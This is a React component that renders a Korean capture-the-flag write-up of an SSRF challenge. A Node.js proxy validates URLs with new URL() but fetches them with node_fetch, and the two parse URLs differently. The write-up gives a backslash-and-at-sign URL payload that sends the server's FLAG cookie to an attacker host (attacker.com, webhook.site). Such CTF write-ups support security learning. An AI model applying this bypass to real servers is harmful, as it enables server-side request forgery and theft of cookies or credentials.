export default function Problem3() {
  return (
    <div className="space-y-10">

      {/* 1. 문제 개요 */}
      <div className="space-y-4">
        <h2 className="text-xl font-orbitron text-white border-b border-neutral-800 pb-3">
          1. Problem Overview
        </h2>
        <p className="text-neutral-300 font-sans leading-relaxed text-sm">
          본 과제의 목표는 사용자가 입력한 URL을 대리 요청해 주는 서버의 <span className="text-emerald-400 font-semibold">프록시(Proxy)</span> 기능에 존재하는 허점을 찔러, 
          서버가 보유한 <span className="text-emerald-400 font-semibold">FLAG 쿠키</span>를 외부로 탈취하는 것이다. 
          이를 위해 입력값을 검증하는 모듈과 실제 HTTP 요청을 수행하는 모듈 간의 URL 해석 차이를 악용하는 
          <span className="text-emerald-400 font-semibold">SSRF(Server-Side Request Forgery)</span> 공격 기법을 활용한다.
        </p>
      </div>

      {/* 2. 취약점 분석 */}
      <div className="space-y-4">
        <h2 className="text-xl font-orbitron text-white border-b border-neutral-800 pb-3">
          2. Vulnerability Analysis
        </h2>
        <p className="text-neutral-400 font-sans text-sm leading-relaxed">
          해당 Node.js(Express) 애플리케이션은 사용자가 전달한 URL 문자열을 검증하고 요청을 보낸다.
        </p>
        <div className="space-y-3">
          <div className="flex gap-4 p-4 bg-neutral-950 rounded-xl border border-neutral-800">
            <code className="text-emerald-400 font-mono text-sm shrink-0 mt-0.5">검증 로직</code>
            <p className="text-neutral-300 font-sans text-sm leading-relaxed">
              <span className="text-emerald-400 font-semibold">new URL(url)</span> 객체를 통해 파싱한 뒤, 
              추출된 <span className="text-emerald-400 font-semibold">hostname</span> 속성이 정확히 
              <span className="text-emerald-400 font-semibold">localhost</span>이거나 localhost로 끝나는지 검증한다.
            </p>
          </div>
          <div className="flex gap-4 p-4 bg-neutral-950 rounded-xl border border-neutral-800">
            <code className="text-emerald-400 font-mono text-sm shrink-0 mt-0.5">요청 수행</code>
            <p className="text-neutral-300 font-sans text-sm leading-relaxed">
              필터링을 통과하면 <span className="text-emerald-400 font-semibold">node_fetch(url)</span>를 이용해 GET 요청을 보내며, 
              요청 헤더에 <span className="text-emerald-400 font-semibold">Cookie: FLAG=FLAG&#123;dummy&#125;</span>를 포함하여 전송한다.
            </p>
          </div>
          <div className="flex gap-4 p-4 bg-neutral-950 rounded-xl border border-red-900/40">
            <code className="text-red-400 font-mono text-sm shrink-0 mt-0.5">핵심 취약점</code>
            <p className="text-neutral-300 font-sans text-sm leading-relaxed">
              최신 WHATWG 표준의 <span className="text-emerald-400 font-semibold">new URL()</span> 파서와 
              실제 요청을 수행하는 <span className="text-emerald-400 font-semibold">node_fetch</span> 내부 모듈 간의 
              <span className="text-red-400 font-semibold underline decoration-2 underline-offset-4">해석 불일치(Inconsistency)</span>에 있다.
            </p>
          </div>
        </div>
      </div>

      {/* 3. Exploit */}
      <div className="space-y-4">
        <h2 className="text-xl font-orbitron text-white border-b border-neutral-800 pb-3">
          3. Exploit
        </h2>
        <div className="space-y-6">
          {[
            {
              step: "01",
              title: "페이로드 구성 및 전송",
              desc: (
                <p className="text-neutral-400 font-sans text-sm leading-relaxed">
                  <span className="text-emerald-400 font-semibold">http://localhost\@attacker.com</span> 
                  (공격자의 외부 웹훅 서버)과 같이 백슬래시(\)와 골뱅이(@)를 혼합한 조작된 URL을 파라미터로 전달한다.
                </p>
              ),
            },
            {
              step: "02",
              title: "검증 로직 우회 (new URL)",
              desc: (
                <p className="text-neutral-400 font-sans text-sm leading-relaxed">
                  최신 Node.js의 <span className="text-emerald-400 font-semibold">new URL()</span> 모듈은 
                  백슬래시(\)를 경로 구분자(/)와 동일하게 취급하여 
                  <span className="text-emerald-400 font-semibold">hostname</span>을 <span className="text-emerald-400 font-semibold">localhost</span>로 인식한다. 
                  결과적으로 검증 로직을 무사히 통과한다.
                </p>
              ),
            },
            {
              step: "03",
              title: "SSRF 트리거 (node_fetch)",
              desc: (
                <p className="text-neutral-400 font-sans text-sm leading-relaxed">
                  반면 <span className="text-emerald-400 font-semibold">node_fetch</span>는 
                  <span className="text-emerald-400 font-semibold">localhost\</span> 부분을 사용자 이름으로, 
                  <span className="text-emerald-400 font-semibold">attacker.com</span>을 실제 목적지(Destination Host)로 인식하여 요청을 보낸다.
                </p>
              ),
            },
            {
              step: "04",
              title: "데이터 반출 및 확인",
              desc: (
                <p className="text-neutral-400 font-sans text-sm leading-relaxed">
                  공격자의 서버에 남은 접근 로그에서 서버가 강제로 덧붙인 
                  <span className="text-emerald-400 font-semibold">FLAG 쿠키 헤더</span>를 확인하여 플래그를 성공적으로 획득한다.
                </p>
              ),
            },
          ].map(({ step, title, desc }) => (
            <div key={step} className="flex gap-5">
              <div className="shrink-0 w-9 h-9 rounded-full bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center">
                <span className="font-orbitron text-emerald-400 text-xs">{step}</span>
              </div>
              <div className="space-y-1 pt-1">
                <h3 className="text-white font-semibold font-sans text-sm">{title}</h3>
                {desc}
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* 4. PAYLOAD */}
      <div className="space-y-4">
        <h2 className="text-xl font-orbitron text-white border-b border-neutral-800 pb-3">
          4. PAYLOAD
        </h2>
        <div className="p-6 bg-emerald-500/5 border border-emerald-500/20 rounded-xl relative group overflow-hidden">
          
          <code className="font-mono text-emerald-300 text-sm break-all">
            /fetch?url=https://localhost\@webhook.site/웹훅주소
          </code>
        </div>
      </div>

    </div>
  );
}
